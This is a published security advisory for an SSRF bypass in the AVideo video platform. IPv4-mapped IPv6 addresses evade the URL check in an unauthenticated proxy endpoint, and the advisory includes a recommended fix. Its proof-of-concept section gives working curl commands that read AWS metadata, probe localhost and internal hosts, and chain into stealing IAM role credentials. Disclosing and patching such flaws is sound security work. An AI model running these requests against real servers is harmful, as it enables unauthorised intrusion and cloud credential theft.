# [H] AVideo has a SSRF Protection Bypass via IPv4-Mapped IPv6 Addresses in Unauthenticated LiveLinks Proxy

## Summary
Severity: High
Advisory: GHSA-p3gr-g84w-g8hh
CVE: CVE-2026-33480
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-p3gr-g84w-g8hh
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `isSSRFSafeURL()` function in AVideo can be bypassed using IPv4-mapped IPv6 addresses (`::ffff:x.x.x.x`). The unauthenticated `plugin/LiveLinks/proxy.php` endpoint uses this function to validate URLs before fetching them with curl, but the IPv4-mapped IPv6 prefix passes all checks, allowing an attacker to access cloud metadata services, internal networks, and localhost services.

## Details

The `isSSRFSafeURL()` function in `objects/functions.php` (lines 4021-4169) implements SSRF protection with two separate check paths:

1. **IPv4 checks** (lines 4101-4134): Regex patterns matching dotted-decimal notation (`/^10\./`, `/^172\./`, `/^192\.168\./`, `/^127\./`, `/^169\.254\./`)
2. **IPv6 checks** (lines 4150-4166): Checks for `::1`, `fe80::/10` (link-local), and `fc00::/7` (unique local)

The gap: IPv4-mapped IPv6 addresses (`::ffff:0:0/96`) are not checked in either path. When a URL like `http://[::ffff:169.254.169.254]/` is provided:

```
// Line 4038: parse_url strips brackets from IPv6 host
$host = parse_url($url, PHP_URL_HOST);
// $host = "::ffff:169.254.169.254"

// Line 4079: filter_var recognizes it as valid IPv6, skips DNS resolution
if (!filter_var($host, FILTER_VALIDATE_IP)) {
    $resolvedIP = gethostbyname($host);  // SKIPPED
}
$ip = $host;  // $ip = "::ffff:169.254.169.254"

// Lines 4101-4134: IPv4 regex checks DON'T match (not dotted-decimal)
if (preg_match('/^169\.254\.\d{1,3}\.\d{1,3}$/', $ip))  // NO MATCH

// Lines 4150-4166: IPv6 checks don't cover ::ffff: prefix
if ($ip === '::1' || ...)                    // NO MATCH
if (preg_match('/^fe[89ab][0-9a-f]:/i', $ip))  // NO MATCH
if (preg_match('/^f[cd][0-9a-f]{2}:/i', $ip))  // NO MATCH

// Line 4168: returns TRUE — bypass complete
return true;
```

The vulnerable endpoint `plugin/LiveLinks/proxy.php` explicitly disables authentication:

```php
// proxy.php lines 2-3
$doNotConnectDatabaseIncludeConfig = 1;
$doNotStartSessionbaseIncludeConfig = 1;
```

After the bypass, two requests are made to the attacker-controlled URL:
1. `get_headers()` at line 40 (via stream context)
2. `fakeBrowser()` at line 63 (via curl) — response content is echoed back to the attacker (lines 69-80)

## PoC

**Read AWS instance metadata (IAM credentials):**

```bash
curl -s 'https://target.com/plugin/LiveLinks/proxy.php?livelink=http://[::ffff:169.254.169.254]/latest/meta-data/'
```

**Access localhost services:**

```bash
curl -s 'https://target.com/plugin/LiveLinks/proxy.php?livelink=http://[::ffff:127.0.0.1]:3306/'
```

**Scan internal network:**

```bash
curl -s 'https://target.com/plugin/LiveLinks/proxy.php?livelink=http://[::ffff:10.0.0.1]/'
```

**Steal AWS IAM role credentials (full chain):**

```bash
# Step 1: Get IAM role name
ROLE=$(curl -s 'https://target.com/plugin/LiveLinks/proxy.php?livelink=http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/')

# Step 2: Get temporary credentials for the role
curl -s "https://target.com/plugin/LiveLinks/proxy.php?livelink=http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/${ROLE}"
```

## Impact

- **Cloud credential theft**: Unauthenticated attackers can read cloud instance metadata (AWS IMDSv1, GCP, Azure) to steal IAM credentials, potentially gaining full access to cloud infrastructure.
- **Internal network access**: Attackers can scan and access internal services not exposed to the internet, including databases, admin panels, and other backend services.
- **Localhost service access**: Attackers can interact with services bound to localhost (e.g., Redis, Memcached, internal APIs).
- **No authentication required**: The endpoint explicitly disables session handling and database connections, making this exploitable by any anonymous internet user.

## Recommended Fix

Replace the manual IPv4/IPv6 blocklist approach with PHP's built-in `FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE` flags, which correctly handle all private/reserved ranges including IPv4-mapped IPv6 addresses:

```php
// In isSSRFSafeURL(), replace lines 4099-4166 with:

// Block all private and reserved IP ranges (handles IPv4, IPv6, and IPv4-mapped IPv6)
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    _error_log("isSSRFSafeURL: blocked private/reserved IP: {$ip}");
    return false;
}
```

This single check replaces all the manual regex patterns and correctly handles:
- All RFC 1918 private ranges (10/8, 172.16/12, 192.168/16)
- Loopback (127/8, ::1)
- Link-local (169.254/16, fe80::/10)
- Unique local (fc00::/7)
- **IPv4-mapped IPv6 (`::ffff:0:0/96`)** — the bypass vector in this finding
- Other reserved ranges (0/8, 100.64/10 CGN, etc.)

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-p3gr-g84w-g8hh
- https://nvd.nist.gov/vuln/detail/CVE-2026-33480
- https://github.com/WWBN/AVideo/commit/75ce8a579a58c9d4c7aafe453fbced002cb8f373
- https://github.com/WWBN/AVideo
